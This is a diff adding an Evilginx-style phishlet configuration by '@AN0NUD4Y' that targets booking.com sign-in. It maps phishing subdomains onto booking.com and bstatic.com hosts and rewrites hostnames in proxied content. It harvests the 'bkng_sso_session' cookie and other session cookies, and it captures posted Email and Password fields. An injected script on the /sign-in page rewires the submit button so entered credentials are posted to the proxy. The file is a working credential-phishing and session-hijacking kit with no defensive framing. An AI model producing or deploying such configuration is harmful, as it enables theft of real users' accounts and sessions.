@@ -1,0 +1,83 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'booking.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'booking.com', session: true, is_landing: false}
+  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'booking.com', session: true, is_landing: false}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'booking.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'account', domain: 'booking.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'q-cf', domain: 'bstatic.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'account.booking.com', orig_sub: 'account', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'account', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'account', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'account.booking.com', orig_sub: 'www', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'account.booking.com', orig_sub: 'admin', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'admin', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'admin', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'account.booking.com', orig_sub: 'secure', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'secure', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'secure', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+
+  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'account.booking.com', orig_sub: '', domain: 'booking.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: '', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: '', domain: 'booking.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'account.booking.com', orig_sub: 'q-cf', domain: 'bstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'q-cf', domain: 'bstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'account.booking.com', orig_sub: 'q-cf', domain: 'bstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+auth_tokens:
+  - domain: '.booking.com'
+    keys: ['bkng_sso_session','.*,regexp']
+
+credentials:
+  username:
+    key: 'Email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'account.booking.com'
+  path: '/sign-in'
+
+js_inject:
+  - trigger_domains: ["account.booking.com"]
+    trigger_paths: ["/sign-in"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.querySelectorAll('button[type=button]')[4];
+        submit.setAttribute("onclick", "sendData()");
+        return;
+      }
+      function sendData(){
+        var email = document.getElementsByName("username")[0].value;
+        var password = document.getElementsByName("password")[0].value;
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", '/', true);
+        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr2.send("Email="+encodeURIComponent(email));
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2500);
+      
